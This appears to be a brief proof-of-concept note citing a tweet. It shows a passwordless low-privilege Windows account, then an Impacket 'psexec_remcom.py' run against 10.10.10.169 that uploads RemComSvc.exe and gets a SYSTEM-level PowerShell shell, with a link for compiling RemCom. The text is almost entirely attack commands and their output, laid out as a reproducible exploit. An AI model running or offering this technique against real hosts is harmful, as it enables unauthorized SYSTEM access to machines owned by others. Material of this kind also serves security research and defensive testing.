Original Report https://twitter.com/bugch3ck/status/1626963208811470848

```
>net user test
User name                    test
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18-02-2023 23:59:20
Password expires             Never
Password changeable          18-02-2023 23:59:20
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   19-02-2023 00:37:10

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```


```
# python3 psexec_remcom.py test@10.10.10.169 powershell -file /tmp/RemComSvc.exe                      1 ⚙
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[!] Press help for extra shell commands
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

whoami
PS C:\WINDOWS\system32> whoami
nt authority\system
```

Compile from here https://github.com/kavika13/RemCom
